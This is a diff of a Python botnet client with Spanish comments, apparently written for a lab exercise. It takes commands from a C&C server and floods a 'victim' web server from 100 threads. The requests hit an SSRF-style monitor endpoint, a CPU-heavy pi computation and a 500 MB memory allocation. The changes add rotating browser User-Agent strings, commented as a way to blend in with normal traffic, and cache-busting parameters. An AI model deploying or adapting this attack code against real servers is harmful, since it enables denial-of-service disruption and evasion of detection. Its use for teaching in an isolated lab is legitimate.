@@ -15,7 +15,7 @@ import random
 CNC_IP = "192.168.0.17"   # IP del servidor CnC (tu ordenador)
 CNC_PORT = 9999
 
-TARGET_IP = "192.168.0.18" # IP de la Víctima (Servidor a atacar)
+TARGET_IP = "192.168.0.17" # IP de la Víctima (Servidor a atacar)
 BASE_URL = f"http://{TARGET_IP}"
 
 # Número de hilos simultáneos
@@ -25,6 +25,17 @@ NUM_HILOS = 100
 # Tarea: Rellena estas funciones con las peticiones que has diseñado
 # tras investigar el servidor.
 
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+]
+
+# Nos permite ser un poco más parecidos a tráfico normal
+headers = {
+        "User-Agent": random.choice(user_agents)
+}
+
 def ataque1():
     """
     Se ejecuta cuando el C&C manda: A1
@@ -33,7 +44,7 @@ def ataque1():
     try:
         # Hosteamos en el puerto 80 un black hole: nc -lkp 80
         # requests.get(f"{BASE_URL}/monitor?target=192.168.0.17") 
-        requests.get(f"{BASE_URL}/monitor?target=https://httpbin.org/delay/5")
+        requests.get(f"{BASE_URL}/monitor?target=https://httpbin.org/delay/5", headers=headers)
         pass
     except:
         pass
@@ -44,7 +55,7 @@ def ataque2():
     Ataca CPU
     """
     try:
-        requests.get(f"{BASE_URL}/pi?iterations=1000000") # Hosteamos en el puerto 80 un black hole: nc -lkp 80
+        requests.get(f"{BASE_URL}/pi?iterations=1000000&?cache_bust={random.randint(0,10000000)}", headers=headers)
         pass
     except:
         pass
@@ -54,7 +65,7 @@ def ataque3():
     Se ejecuta cuando el C&C manda: A3
     """
     try:
-        requests.post(f"{BASE_URL}/allocations", data='{"mb":500}') # Hosteamos en el puerto 80 un black hole: nc -lkp 80
+        requests.post(f"{BASE_URL}/allocations", data='{"mb":500}', headers=headers)
         pass
     except:
         pass
@@ -118,7 +129,7 @@ def conectar_cnc():
             time.sleep(5)
 
 if __name__ == "__main__":
-    if sys.argv[1] == "-d":
+    if len(sys.argv) >= 2 and sys.argv[1] == "-d":
         print("Posibles comandos: cpu, ram, workers, quit")
         while True:
             try:
